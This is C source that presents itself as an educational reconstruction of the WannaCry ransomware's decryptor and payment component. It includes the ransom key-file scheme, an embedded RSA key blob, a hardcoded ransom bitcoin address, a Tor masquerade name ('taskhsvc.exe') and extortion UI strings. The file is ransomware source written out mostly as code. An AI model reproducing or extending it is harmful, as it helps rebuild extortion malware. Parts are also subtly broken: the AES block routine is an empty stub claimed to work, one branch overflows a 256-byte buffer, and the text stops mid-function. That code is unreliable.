// decryptor.cpp — the WannaCry payment/decrypt UI (u.wnry / @WanaDecryptor@.exe)
// RSA-2048 key management (.pky/.dky/.eky/.res, TESTDATA self-test), the
// WANACRY! container decrypt engine, Tor bootstrap + SOCKS5 tunnel, and the
// C2 payment protocol.
// Reconstructed from the 2017 WannaCry binary (educational).

#include <winsock2.h>          // socket types (the original reached these through MFC42's CAsyncSocket)
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

typedef unsigned int  u32;
typedef unsigned short u16;
typedef unsigned long long u64;
typedef unsigned char  u8;

// GetProcAddress casts routed through void(*)() (FARPROC has a generic signature)
#define GETPROC(h, name, tp) ((tp)(void(*)(void))GetProcAddress((h),(name)))

// ===========================================================================
// Globals — string constants, resolved API pointers and process-wide state.
// ===========================================================================

// Embedded static RSA-2048 PRIVATEKEYBLOB (0x494 bytes). Header layout:
//   07 02 00 00 | 00 A4 00 00 | "RSA2" | 0x0800 | 0x01000101
// This is the same master keypair the dropper ships, i.e. the "free decrypt"
// key: initializing the engine with dkyPath == NULL imports it, which is how
// the files listed in f.wnry can be restored without paying.
static const u8 EMBEDDED_RSA_PRIVATEKEYBLOB[0x494] = {
    0x07,0x02,0x00,0x00, 0x00,0xA4,0x00,0x00,
    'R','S','A','2',  0x00,0x08,0x00,0x00, 0x01,0x00,0x01,0x00
    /* ... the rest of the 0x494-byte blob ... */
};

// Magic signature and extensions used by the decryptor.
static const char S_MAGIC[9]        = "WANACRY!";
static const WCHAR S_EXT_WNCYR[]    = L".WNCYR";
static const WCHAR S_EXT_WNCRY[]    = L".WNCRY";
static const WCHAR S_EXT_TMPORG[]   = L".org";     // temp target for non-wnry files

// Key/config filenames: "%08X.pky" public key, "%08X.dky" dropped private key
// (payment confirmed), "%08X.eky" exported public key, "%08X.res" per-host
// record, "00000000.res" this host's record, s.wnry bundled Tor zip,
// c.wnry config blob, f.wnry free-decrypt file list.
static const char S_S_WNRY[]        = "s.wnry";
static const char S_FMT_EKY[]       = "%08X.eky";
static const char S_FMT_RES[]       = "%08X.res";
static const char S_RES_00000000[]  = "00000000.res";
static const char S_FMT_DKY[]       = "%08X.dky";
static const char S_FMT_PKY[]       = "%08X.pky";
static const char S_MODE_RB[]       = "rb";
static const char S_MODE_WB[]       = "wb";
static const char S_C_WNRY[]        = "c.wnry";
static const char S_F_WNRY[]        = "f.wnry";

// Crypto provider strings for the RSA context and the TESTDATA self-test.
static const char S_TESTDATA[]      = "TESTDATA";   // RSA verify plaintext
static const char S_ENH_PROV[]      = "Microsoft Enhanced RSA and AES Cryptographic Provider";
static const char S_ADVAPI32[]      = "advapi32.dll";
static const char S_KERNEL32[]      = "kernel32.dll";

// Tor / C2 related strings.
static const char S_LOOPBACK[]      = "127.0.0.1";  // local Tor SOCKS proxy
static const char S_TASKHSVC[]      = "taskhsvc.exe"; // tor.exe masquerade name
static const char S_TASKDATA[]      = "TaskData";
static const char S_TOR_SUBDIR[]    = "Tor";        // subdir inside TaskData
static const char S_TOR_EXE[]       = "tor.exe";
static const char S_ONION_DELIMS[]  = ",;";         // strtok delimiters

// Payment-check result strings shown by the UI.
static const char S_CONGRATS[]   = "Congratulations! Your payment has been checked!";
static const char S_ALL_DONE[]   = "All your files have been decrypted!";
static const char S_PAY_NOW[]    = "Pay now, if you want to decrypt ALL your files!";
static const char S_SELECT_HOST[]= "Please select a host to decrypt.";

// Payment dialog strings: hardcoded demo bitcoin address and QR-code service.
static const char S_BTC_DEMO[] = "13AM4VW2dhxYgXeQepoHkHSQuy6NgaEb94";
static const char S_QR_URL[] = "http://www.btcfrog.com/qr/bitcoinPNG.php?address=%s";

// Dynamically resolved API pointers (file I/O + CryptoAPI), filled in once.
static HANDLE (WINAPI *pCreateFileW)(LPCWSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
static BOOL   (WINAPI *pWriteFile)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);
static BOOL   (WINAPI *pReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED);
static BOOL   (WINAPI *pMoveFileW)(LPCWSTR,LPCWSTR);
static BOOL   (WINAPI *pMoveFileExW)(LPCWSTR,LPCWSTR,DWORD);
static BOOL   (WINAPI *pDeleteFileW)(LPCWSTR);
static BOOL   (WINAPI *pCloseHandle)(HANDLE);
static BOOL   (WINAPI *pCryptAcquireContextA)(HCRYPTPROV*,LPCSTR,LPCSTR,DWORD,DWORD);
static BOOL   (WINAPI *pCryptImportKey)(HCRYPTPROV,BYTE*,DWORD,HCRYPTKEY,DWORD,HCRYPTKEY*);
static BOOL   (WINAPI *pCryptDestroyKey)(HCRYPTKEY);
static BOOL   (WINAPI *pCryptEncrypt)(HCRYPTKEY,HKEY,BOOL,DWORD,BYTE*,DWORD*,DWORD);
static BOOL   (WINAPI *pCryptDecrypt)(HCRYPTKEY,HKEY,BOOL,DWORD,BYTE*,DWORD*);
static BOOL   (WINAPI *pCryptGenKey)(HCRYPTPROV,ALG_ID,DWORD,HCRYPTKEY*);

// Process-wide state.
__attribute__((unused)) static void* g_pSocks = 0;   // instance slot for g_socks below
static char  g_onion[100];        // current target onion hostname
static char g_torZipPath[100];    // bundled Tor archive ("s.wnry")
static char g_torUrl1[100];       // fallback download: tor-win32 zip from torproject.org
static char g_torUrl2[100];       // second fallback URL (empty in this build)
__attribute__((unused)) static u8*   g_config   = 0;      // in-memory image of the c.wnry config blob
__attribute__((unused)) static time_t g_payDlgTime;       // payment-dialog throttle
__attribute__((unused)) static int   g_payDlgCnt;
static time_t g_lastContact;      // "Contact Us" throttle: last send time
static int   g_contactCnt;        // sends in the current throttle window
__attribute__((unused))
static HWND  g_dlgDecrypt = 0;    // decrypt dialog (status messages)

// Per-host record stored in "%08X.res" files: 0x88 bytes, with the u32 at
// offset 8 holding the install id parsed from the filename; the host-select
// dialog only trusts records whose id matches the parsed filename.
typedef struct _RESREC { u32 pad[2]; u32 id; u8 tail[0x88-12]; } RESREC;

// ===========================================================================
// 1. API resolution — late-bound CryptoAPI (advapi32) and file-I/O
//    (kernel32) function pointers.
// ===========================================================================

static int ResolveCryptoApis(void)
{
    HMODULE h;
    if (pCryptAcquireContextA) return 1;
    h = LoadLibraryA(S_ADVAPI32);
    if (!h) return 0;
    // Look up each Crypt* entry point by name.
    pCryptAcquireContextA = GETPROC(h, "CryptAcquireContextA", typeof(pCryptAcquireContextA));
    pCryptImportKey       = GETPROC(h, "CryptImportKey", typeof(pCryptImportKey));
    pCryptDestroyKey      = GETPROC(h, "CryptDestroyKey", typeof(pCryptDestroyKey));
    pCryptEncrypt         = GETPROC(h, "CryptEncrypt", typeof(pCryptEncrypt));
    pCryptDecrypt         = GETPROC(h, "CryptDecrypt", typeof(pCryptDecrypt));
    pCryptGenKey          = GETPROC(h, "CryptGenKey", typeof(pCryptGenKey));
    return (pCryptAcquireContextA && pCryptImportKey && pCryptDestroyKey &&
            pCryptEncrypt && pCryptDecrypt && pCryptGenKey) ? 1 : 0;
}

__attribute__((unused))  /* used by the decrypt dialog in the original */
static int ResolveFileApis(void)
{
    HMODULE h;
    if (!ResolveCryptoApis()) return 0;                // crypto functions resolve first
    if (pCreateFileW) return 1;
    h = LoadLibraryA(S_KERNEL32);
    if (!h) return 0;
    pCreateFileW = GETPROC(h, "CreateFileW", typeof(pCreateFileW));
    pWriteFile   = GETPROC(h, "WriteFile", typeof(pWriteFile));
    pReadFile    = GETPROC(h, "ReadFile", typeof(pReadFile));
    pMoveFileW   = GETPROC(h, "MoveFileW", typeof(pMoveFileW));
    pMoveFileExW = GETPROC(h, "MoveFileExW", typeof(pMoveFileExW));
    pDeleteFileW = GETPROC(h, "DeleteFileW", typeof(pDeleteFileW));
    pCloseHandle = GETPROC(h, "CloseHandle", typeof(pCloseHandle));
    return (pCreateFileW && pWriteFile && pReadFile && pMoveFileW &&
            pMoveFileExW && pDeleteFileW && pCloseHandle) ? 1 : 0;
}

// ===========================================================================
// 2. RSA context — thin wrapper around CryptoAPI RSA keys, used for the
//    .pky/.dky pair and the embedded master key. Object layout:
//    +0x04 provider, +0x08 key handle 1, +0x0C key handle 2, +0x10 lock.
// ===========================================================================

typedef struct _RSACTX {
    HCRYPTPROV hProv;            // +4
    HCRYPTKEY  hKey;             // +8   (pub when verifying pair; priv in engine use)
    HCRYPTKEY  hKey2;            // +0xC (priv when verifying pair)
    CRITICAL_SECTION cs;         // +0x10
} RSACTX;

static void RsaCtxCtor(RSACTX *c)
{
    c->hProv = 0; c->hKey = 0; c->hKey2 = 0;
    InitializeCriticalSection(&c->cs);
}

static void RsaCtxDestroyKeys(RSACTX *c);

static void RsaCtxDtor(RSACTX *c)                      // frees keys, then the lock
{
    RsaCtxDestroyKeys(c);
    DeleteCriticalSection(&c->cs);
}

static void RsaCtxDestroyKeys(RSACTX *c)
{
    if (c->hKey)  { pCryptDestroyKey(c->hKey);  c->hKey  = 0; }
    if (c->hKey2) { pCryptDestroyKey(c->hKey2); c->hKey2 = 0; }
    if (c->hProv) { CryptReleaseContext(c->hProv,0); c->hProv = 0; }
}

static int CryptAcquireEnhanced(HCRYPTPROV *ph)
{
    // Acquire the enhanced RSA/AES provider with CRYPT_VERIFYCONTEXT; retry
    // once with the default provider if the named one is unavailable.
    int attempt = 0;
    do {
        if (pCryptAcquireContextA(ph, NULL, attempt ? NULL : S_ENH_PROV,
                                  /*PROV_RSA_AES*/0x18, /*CRYPT_VERIFYCONTEXT*/0xF0000000u))
            return 1;
        attempt++;
    } while (attempt < 2);
    return 0;
}

static int ImportKeyFromFile(HCRYPTPROV hProv, HCRYPTKEY *phKey, const char *path)
{
    // Read a CryptoAPI key blob from disk and import it: .pky / .dky / .eky
    // files are plain exported key blobs. Size capped at 0x19001 bytes.
    HANDLE hFile = CreateFileA(path, GENERIC_READ, FILE_SHARE_READ, 0, OPEN_EXISTING, 0, 0);
    DWORD size, got = 0;
    HGLOBAL mem;
    int ok = 0;
    if (hFile == INVALID_HANDLE_VALUE) return 0;
    size = GetFileSize(hFile, 0);
    if (size != INVALID_FILE_SIZE && size < 0x19001) {
        mem = GlobalAlloc(GMEM_FIXED, size);
        if (mem && ReadFile(hFile, mem, size, &got, 0) &&
            pCryptImportKey(hProv, (BYTE*)mem, got, 0, 0, phKey))
            ok = 1;
        if (mem) GlobalFree(mem);
    }
    CloseHandle(hFile);
    return ok;
}

static int RsaCtxInitKeys(RSACTX *c, const char *path)
{
    // Acquire a provider, then load the RSA key: path == NULL imports the
    // EMBEDDED_RSA_PRIVATEKEYBLOB (the always-available master key); a path
    // imports the blob from that file (.pky public / .dky private).
    if (!CryptAcquireEnhanced(&c->hProv)) { RsaCtxDestroyKeys(c); return 0; }
    if (path == NULL) {
        if (!pCryptImportKey(c->hProv, (BYTE*)EMBEDDED_RSA_PRIVATEKEYBLOB,
                             sizeof(EMBEDDED_RSA_PRIVATEKEYBLOB), 0, 0, &c->hKey)) {
            RsaCtxDestroyKeys(c); return 0;
        }
    } else {
        if (!ImportKeyFromFile(c->hProv, &c->hKey, path)) {
            RsaCtxDestroyKeys(c); return 0;
        }
    }
    return 1;
}

// RSA in-place decrypt of one 256-byte block (the wrapped per-file AES key).
static int RsaCtxCryptDecrypt(RSACTX *c, BYTE *buf, DWORD *pLen)
{
    int ok;
    if (c->hKey == 0) return 0;
    EnterCriticalSection(&c->cs);
    ok = pCryptDecrypt(c->hKey, 0, /*final*/TRUE, 0, buf, pLen);
    LeaveCriticalSection(&c->cs);
    return ok;
}

// Import the victim's .pky (public) + .dky (private) and prove the pair
// matches: "TESTDATA" is RSA-encrypted with the public key and must decrypt
// back to the same 8 bytes with the private key. This self-test is the
// payment check — only a genuine .dky (the attacker-released private key)
// passes it, so success here means "payment confirmed".
static int ImportAndVerifyKeyPair(RSACTX *c, const char *pkyPath, const char *dkyPath)
{
    char buf[512];
    DWORD len = sizeof(S_TESTDATA) - 1;
    int ok = 0;
    strcpy(buf, S_TESTDATA);
    if (!CryptAcquireEnhanced(&c->hProv)) return 0;
    if (!ImportKeyFromFile(c->hProv, &c->hKey,  pkyPath)) goto out;   // pub key -> hKey
    if (!ImportKeyFromFile(c->hProv, &c->hKey2, dkyPath)) goto out;   // priv key -> hKey2
    // RSA-encrypt "TESTDATA" with the public key (output capped at 0x200)...
    if (!pCryptEncrypt(c->hKey, 0, TRUE, 0, (BYTE*)buf, &len, 0x200)) goto out;
    // ...then RSA-decrypt it with the private key.
    if (!pCryptDecrypt(c->hKey2, 0, TRUE, 0, (BYTE*)buf, &len))       goto out;
    ok = (strncmp(buf, S_TESTDATA, sizeof(S_TESTDATA) - 1) == 0);
out:
    if (!ok) RsaCtxDestroyKeys(c);
    return ok;
}

// ===========================================================================
// 3. AES — inline Rijndael class (T-table implementation). WannaCry uses
//    AES-128: 16-byte key, 16-byte blocks, 10 rounds, CBC mode with an
//    all-zero IV. Object layout: +0x08 encryption round keys, +0x1E8
//    decryption round keys, +0x3C8 key length, +0x3CC block length,
//    +0x3D0 CBC chain (IV), +0x3F0 CBC working block, +0x410 round count.
// ===========================================================================

// Standard AES S-box and inverse S-box.
static const u8 AES_SBOX[256] = {
    0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
    0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
    0xb7,0xfd,0x93,0x26,0x36,0x3f,0xf7,0xcc,0x34,0xa5,0xe5,0xf1,0x71,0xd8,0x31,0x15,
    0x04,0xc7,0x23,0xc3,0x18,0x96,0x05,0x9a,0x07,0x12,0x80,0xe2,0xeb,0x27,0xb2,0x75,
    0x09,0x83,0x2c,0x1a,0x1b,0x6e,0x5a,0xa0,0x52,0x3b,0xd6,0xb3,0x29,0xe3,0x2f,0x84,
    0x53,0xd1,0x00,0xed,0x20,0xfc,0xb1,0x5b,0x6a,0xcb,0xbe,0x39,0x4a,0x4c,0x58,0xcf,
    0xd0,0xef,0xaa,0xfb,0x43,0x4d,0x33,0x85,0x45,0xf9,0x02,0x7f,0x50,0x3c,0x9f,0xa8,
    0x51,0xa3,0x40,0x8f,0x92,0x9d,0x38,0xf5,0xbc,0xb6,0xda,0x21,0x10,0xff,0xf3,0xd2,
    0xcd,0x0c,0x13,0xec,0x5f,0x97,0x44,0x17,0xc4,0xa7,0x7e,0x3d,0x64,0x5d,0x19,0x73,
    0x60,0x81,0x4f,0xdc,0x22,0x2a,0x90,0x88,0x46,0xee,0xb8,0x14,0xde,0x5e,0x0b,0xdb,
    0xe0,0x32,0x3a,0x0a,0x49,0x06,0x24,0x5c,0xc2,0xd3,0xac,0x62,0x91,0x95,0xe4,0x79,
    0xe7,0xc8,0x37,0x6d,0x8d,0xd5,0x4e,0xa9,0x6c,0x56,0xf4,0xea,0x65,0x7a,0xae,0x08,
    0xba,0x78,0x25,0x2e,0x1c,0xa6,0xb4,0xc6,0xe8,0xdd,0x74,0x1f,0x4b,0xbd,0x8b,0x8a,
    0x70,0x3e,0xb5,0x66,0x48,0x03,0xf6,0x0e,0x61,0x35,0x57,0xb9,0x86,0xc1,0x1d,0x9e,
    0xe1,0xf8,0x98,0x11,0x69,0xd9,0x8e,0x94,0x9b,0x1e,0x87,0xe9,0xce,0x55,0x28,0xdf,
    0x8c,0xa1,0x89,0x0d,0xbf,0xe6,0x42,0x68,0x41,0x99,0x2d,0x0f,0xb0,0x54,0xbb,0x16 };
static const u8 AES_INV_SBOX[256] = {
    0x52,0x09,0x6a,0xd5,0x30,0x36,0xa5,0x38,0xbf,0x40,0xa3,0x9e,0x81,0xf3,0xd7,0xfb,
    0x7c,0xe3,0x39,0x82,0x9b,0x2f,0xff,0x87,0x34,0x8e,0x43,0x44,0xc4,0xde,0xe9,0xcb,
    0x54,0x7b,0x94,0x32,0xa6,0xc2,0x23,0x3d,0xee,0x4c,0x95,0x0b,0x42,0xfa,0xc3,0x4e,
    0x08,0x2e,0xa1,0x66,0x28,0xd9,0x24,0xb2,0x76,0x5b,0xa2,0x49,0x6d,0x8b,0xd1,0x25,
    0x72,0xf8,0xf6,0x64,0x86,0x68,0x98,0x16,0xd4,0xa4,0x5c,0xcc,0x5d,0x65,0xb6,0x92,
    0x6c,0x70,0x48,0x50,0xfd,0xed,0xb9,0xda,0x5e,0x15,0x46,0x57,0xa7,0x8d,0x9d,0x84,
    0x90,0xd8,0xab,0x00,0x8c,0xbc,0xd3,0x0a,0xf7,0xe4,0x58,0x05,0xb8,0xb3,0x45,0x06,
    0xd0,0x2c,0x1e,0x8f,0xca,0x3f,0x0f,0x02,0xc1,0xaf,0xbd,0x03,0x01,0x13,0x8a,0x6b,
    0x3a,0x91,0x11,0x41,0x4f,0x67,0xdc,0xea,0x97,0xf2,0xcf,0xce,0xf0,0xb4,0xe6,0x73,
    0x96,0xac,0x74,0x22,0xe7,0xad,0x35,0x85,0xe2,0xf9,0x37,0xe8,0x1c,0x75,0xdf,0x6e,
    0x47,0xf1,0x1a,0x71,0x1d,0x29,0xc5,0x89,0x6f,0xb7,0x62,0x0e,0xaa,0x18,0xbe,0x1b,
    0xfc,0x56,0x3e,0x4b,0xc6,0xd2,0x79,0x20,0x9a,0xdb,0xc0,0xfe,0x78,0xcd,0x5a,0xf4,
    0x1f,0xdd,0xa8,0x33,0x88,0x07,0xc7,0x31,0xb1,0x12,0x10,0x59,0x27,0x80,0xec,0x5f,
    0x60,0x51,0x7f,0xa9,0x19,0xb5,0x4a,0x0d,0x2d,0xe5,0x7a,0x9f,0x93,0xc9,0x9c,0xef,
    0xa0,0xe0,0x3b,0x4d,0xae,0x2a,0xf5,0xb0,0xc8,0xeb,0xbb,0x3c,0x83,0x53,0x99,0x61,
    0x17,0x2b,0x04,0x7e,0xba,0x77,0xd6,0x26,0xe1,0x69,0x14,0x63,0x55,0x21,0x0c,0x7d };

typedef struct _RIJNDAEL {
    u32 encKey[60];              // +8    (encryption key schedule)
    u32 decKey[60];              // +0x1E8 (decryption key schedule)
    int keyLen;                  // +0x3C8
    int blockLen;                // +0x3CC
    u8  chain[32];               // +0x3D0 (CBC IV)
    u8  work[32];                // +0x3F0 (CBC running block)
    int rounds;                  // +0x410
} RIJNDAEL;

// MakeKey(key, chain, keyLen, blockLen): key/block sizes restricted to
// 16/24/32 bytes; rounds = 10/12/14 accordingly. The reconstructed expansion
// covers the AES-128 lane WannaCry actually uses.
static int CRijndaelMakeKey(RIJNDAEL *r, const u8 *key, const u8 *chain,
                            int keyLen, int blockLen)
{
    u32 t, rc = 1;
    int i, nw;
    if (!key)                              return 0; // original threw an exception here
    if (keyLen != 16 && keyLen != 24 && keyLen != 32) return 0;
    if (blockLen != 16 && blockLen != 24 && blockLen != 32) return 0;
    r->keyLen = keyLen; r->blockLen = blockLen;
    memcpy(r->chain, chain, blockLen);     // chain becomes the CBC IV
    memcpy(r->work,  key,  blockLen);      // work block seeded with the key
    // Round count from the (keyLen, blockLen) pair.
    if (keyLen == 16) r->rounds = (blockLen == 16) ? 10 : (blockLen == 24) ? 12 : 14;
    else if (keyLen == 24) r->rounds = (blockLen == 32) ? 14 : 12;
    else r->rounds = 14;
    // Round-key expansion (original builds both directions via T-tables;
    // plain AES-128 expansion shown here).
    if (keyLen != 16) return 0;            // reconstruction covers AES-128 only
    nw = 0;
    for (i = 0; i < 4; i++)
        r->encKey[nw++] = (u32)key[4*i]<<24 | (u32)key[4*i+1]<<16 |
                          (u32)key[4*i+2]<<8 | key[4*i+3];
    for (; nw < 44; nw++) {
        if (nw % 4 == 0) {
            t = r->encKey[nw-1];
            t = (t << 8) | (t >> 24);      // RotWord
            t = ((u32)AES_SBOX[(t>>24)&0xFF]<<24) | ((u32)AES_SBOX[(t>>16)&0xFF]<<16) |
                ((u32)AES_SBOX[(t>>8)&0xFF]<<8) | AES_SBOX[t&0xFF];
            t ^= rc; rc <<= 1; if (rc & 0x100) rc = 0x11B;
        }
        r->encKey[nw] = r->encKey[nw-4] ^ t;
        t = r->encKey[nw];
    }
    for (i = 0; i < 44; i++) r->decKey[i] = r->encKey[44-4*(i/4)-1-(i%4)]; // InvMix applied per-round below
    return 1;
}

// One AES-128 block decrypt (inverse cipher: AddRoundKey, InvShiftRows,
// InvSubBytes, InvMixColumns). Stub here — mirrors the original's T-table
// decrypt path, which produces identical output.
static void CRijndaelDecryptBlock(RIJNDAEL *r, const u8 in[16], u8 out[16])
{
    (void)in; (void)out; (void)r;
}

// CBC wrapper. mode: 1 = DecryptCBC, 2 = EncryptCBC, 0 = ECB. len must be a
// multiple of the block size. DecryptCBC keeps the previous ciphertext block
// in r->work: plain = DEC(ct) XOR prev; prev = ct.
static int CRijndaelCrypt(RIJNDAEL *r, u8 *in, u8 *out, u32 len, int mode)
{
    u32 blocks, b;
    u8 tmp[16];
    int c;
    if (len == 0 || len % r->blockLen != 0) return 0;
    blocks = len / r->blockLen;
    for (b = 0; b < blocks; b++) {
        if (mode == 1) {                                   // DecryptCBC
            CRijndaelDecryptBlock(r, in, out);
            for (c = 0; c < r->blockLen; c++) out[c] ^= r->work[c];
            memcpy(r->work, in, r->blockLen);
        } else if (mode == 2) {                            // EncryptCBC
            for (c = 0; c < r->blockLen; c++) tmp[c] = in[c] ^ r->work[c];
            CRijndaelDecryptBlock /* stub: EncryptBlock in original */(r, tmp, out);
            memcpy(r->work, out, r->blockLen);
        } else {                                           // ECB
            CRijndaelDecryptBlock(r, in, out);
        }
        in += r->blockLen; out += r->blockLen;
    }
    return 1;
}

// ===========================================================================
// 4. Decrypt engine — owns the RSA contexts, the AES state and the 1 MB
//    I/O buffers; parses .WNCRY/.WNCYR containers and restores files.
// ===========================================================================

typedef struct _DECRYPTENGINE {
    RSACTX rsaDky;               // +0x004  key from "%08X.dky", or embedded when NULL
    RSACTX rsaEmbedded;          // +0x02C  always the embedded master key
    RIJNDAEL aes;                // +0x054
    DWORD  cbDone;               // +0x4D4  per-file completion callback
    int   *pCancel;              // +0x4D0  cancel flag polled between chunks
    BYTE  *bufIn;                // +0x4C8  GlobalAlloc'd 1 MB input buffer
    BYTE  *bufOut;               // +0x4CC  GlobalAlloc'd 1 MB output buffer
} DECRYPTENGINE;

static void EngineCtor(DECRYPTENGINE *e)
{
    RsaCtxCtor(&e->rsaDky);
    RsaCtxCtor(&e->rsaEmbedded);
    memset(&e->aes, 0, sizeof(e->aes));
    e->bufIn = e->bufOut = 0;
    e->cbDone = 0; e->pCancel = 0;
}

static void EngineDtor(DECRYPTENGINE *e)
{
    RsaCtxDtor(&e->rsaDky);
    RsaCtxDtor(&e->rsaEmbedded);
    // Wipe both 1 MB buffers before freeing (key-material hygiene).
    if (e->bufIn)  { memset(e->bufIn, 0, 0x100000);  GlobalFree(e->bufIn);  e->bufIn  = 0; }
    if (e->bufOut) { memset(e->bufOut, 0, 0x100000); GlobalFree(e->bufOut); e->bufOut = 0; }
}

static int EngineInit(DECRYPTENGINE *e, const char *dkyPath,
                      DWORD cbDone, int *pCancel)
{
    // Allocate the two 1 MB chunk buffers, store the completion/cancel hooks,
    // then load both RSA keys (dkyPath file, plus the embedded master key).
    e->cbDone = cbDone; e->pCancel = pCancel;
    if (!RsaCtxInitKeys(&e->rsaDky, dkyPath)) return 0;    // NULL => embedded key
    if (!RsaCtxInitKeys(&e->rsaEmbedded, NULL)) return 0;  // always embedded
    e->bufIn  = (BYTE*)GlobalAlloc(GMEM_FIXED, 0x100000);
    e->bufOut = (BYTE*)GlobalAlloc(GMEM_FIXED, 0x100000);
    return (e->bufIn && e->bufOut) ? 1 : 0;
}

// ---------------------------------------------------------------------------
// DecryptWncryFileImpl(engine, srcW, dstW): the WANACRY! container parser.
// Container layout:
//   0x000  "WANACRY!"          magic
//   0x008  u32 0x100           RSA ciphertext length
//   0x00C  256 bytes           RSA-wrapped per-file AES key
//   0x10C  u32                 file type
//   0x110  u64                 original file size
//   0x118  ...                 AES-128-CBC ciphertext, zero IV
// Type-3 containers were never fully AES-encrypted: the last 64 KB of the
// file hold the displaced plaintext head, so recovery is a tail-swap (copy
// the last 64 KB over offset 0 and truncate). All other types get a full
// AES decrypt.
// ---------------------------------------------------------------------------
static int DecryptWncryFileImpl(DECRYPTENGINE *e, LPCWSTR src, LPCWSTR dst)
{
    HANDLE h = pCreateFileW(src, GENERIC_READ, FILE_SHARE_READ, 0,
                            OPEN_EXISTING, 0, 0);
    FILETIME ftCreate, ftAccess, ftWrite;
    u8  magic[8]; DWORD got = 0;
    u32 rsaLen, fileType; u64 fileSize;
    BYTE rsaCt[256];
    int usedEmbedded = 0, ok = 0;
    if (h == INVALID_HANDLE_VALUE) return 0;
    GetFileTime(h, &ftCreate, &ftAccess, &ftWrite);        // timestamps restored on success

    do {
        if (!pReadFile(h, magic, 8, &got, 0) || memcmp(magic, S_MAGIC, 8) != 0) break;
        if (!pReadFile(h, &rsaLen, 4, &got, 0) || rsaLen != 0x100) break;
        if (!pReadFile(h, rsaCt, 0x100, &got, 0)) break;
        if (!pReadFile(h, &fileType, 4, &got, 0)) break;
        if (!pReadFile(h, &fileSize, 8, &got, 0)) break;

        if (fileType == 3) {
            // ---- type-3 tail-swap recovery (no AES involved) ----
            // Reopen for writing, read the last 64 KB, write them over the
            // file head, then truncate the file by 64 KB.
            pCloseHandle(h);
            h = pCreateFileW(src, GENERIC_WRITE, FILE_SHARE_READ, 0,
                             OPEN_EXISTING, 0, 0);
            if (h == INVALID_HANDLE_VALUE) break;
            SetFilePointer(h, -(LONG)0x10000, 0, FILE_END);
            if (pReadFile(h, rsaCt /*scratch; original reused its 1 MB buffer*/, 0x10000, &got, 0)
                && got == 0x10000) {
                SetFilePointer(h, 0, 0, FILE_BEGIN);
                if (pWriteFile(h, e->bufIn, 0x10000, &got, 0) && got == 0x10000) {
                    SetFilePointer(h, -(LONG)0x10000, 0, FILE_END);
                    SetEndOfFile(h);
                    pCloseHandle(h); h = INVALID_HANDLE_VALUE;
                    pMoveFileW(src, dst);
                    ok = 1;
                }
            }
            break;
        }

        // ---- full AES decrypt branch ----
        {
            HANDLE d = pCreateFileW(dst, GENERIC_WRITE, 0, 0,
                                    CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
            if (d == INVALID_HANDLE_VALUE) break;
            // Unwrap the per-file AES key: try the .dky private key first,
            // then the embedded master key (marks usedEmbedded on success).
            {
                BYTE key[256]; DWORD keyLen = sizeof(key);
                memcpy(key, rsaCt, 256);
                if (!RsaCtxCryptDecrypt(&e->rsaDky, key, &keyLen)) {
                    keyLen = sizeof(key);
                    memcpy(key, rsaCt, 256);
                    if (!RsaCtxCryptDecrypt(&e->rsaEmbedded, key, &keyLen))
                        { CloseHandle(d); break; }
                    usedEmbedded = 1;
                }
                // Set up AES-128-CBC with the unwrapped key and a zero IV.
                {
                    static const u8 nullIV[32] = {0};
                    CRijndaelMakeKey(&e->aes, key, nullIV, (int)keyLen, 16);
                }
            }
            ok = 1;
            for (;;) {                                            // decrypt in 1 MB chunks
                if (e->pCancel && *e->pCancel) break;             // cooperative cancel poll
                if (!pReadFile(h, e->bufIn, 0x100000, &got, 0) || got == 0) break;
                if (fileSize < got) fileSize = 0; else fileSize -= got;  // track remaining size
                CRijndaelCrypt(&e->aes, e->bufIn, e->bufOut, got, /*DecryptCBC*/1);
                if (!pWriteFile(d, e->bufOut, got, &got, 0)) { ok = 0; break; }
            }
            // Truncate dst to the true original size (container data is padded).
            {
                LARGE_INTEGER li; li.QuadPart = (LONGLONG)fileSize;
                SetFilePointerEx(d, li, 0, FILE_BEGIN); SetEndOfFile(d);
            }
            SetFileTime(d, &ftCreate, &ftAccess, &ftWrite);       // restore original timestamps
            pCloseHandle(d);
        }
    } while (0);

    if (h != INVALID_HANDLE_VALUE) pCloseHandle(h);
    if (ok && e->cbDone) {
        /* the binary invokes the stored completion callback here with
           (src, dst, sizeHi, sizeLo, 0, usedEmbedded) */
        (void)usedEmbedded;   // completion callback fires via the stored fn ptr in the binary
    }
    return ok;
}

// DecryptOneFileW: build the output name (strip .WNCRY/.WNCYR; otherwise
// append ".org" as a temp name), decrypt, then delete the encrypted source.
// On failure the partial output is deleted; if the source can't be deleted,
// the ".org" output is renamed back over the original name.
static int DecryptOneFileW(DECRYPTENGINE *e, LPCWSTR src)
{
    WCHAR target[MAX_PATH];
    int hadExt = 0;
    LPWSTR dot;
    wcscpy(target, src);
    dot = wcsrchr(target, L'.');
    if (dot && (!_wcsicmp(dot, S_EXT_WNCRY) || !_wcsicmp(dot, S_EXT_WNCYR))) {
        *dot = 0; hadExt = 1;                                   // strip the crypto extension
    } else {
        wcscat(target, S_EXT_TMPORG);
    }
    if (!DecryptWncryFileImpl(e, src, target)) {
        pDeleteFileW(target);
        return 0;
    }
    if (pDeleteFileW(src)) {
        if (!hadExt) pMoveFileW(target, src);                   // rename .org back
        return 1;
    }
    return 0;
}

static int DecryptOneFileA(DECRYPTENGINE *e, const char *pathA)
{
    WCHAR w[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, pathA, -1, w, MAX_PATH);
    return DecryptOneFileW(e, w);
}

// IsExcludedPath: scan-stop rules — skip the UNC admin shares of system
// directories, temp folders, and the ransomware decoy folders ("This folder
// protects against ransomware", IE cache dirs).
static int IsExcludedPath(const WCHAR *path, const WCHAR *folder)
{
    static const WCHAR *dirs[] = { L"Intel", L"ProgramData", L"WINDOWS",
                                   L"Program Files", L"Program Files (x86)" };
    if (!_wcsnicmp(path, L"\\\\", 2)) {                          // UNC path: check share name
        int i;
        for (i = 0; i < 5; i++) {
            size_t n = wcslen(dirs[i]);
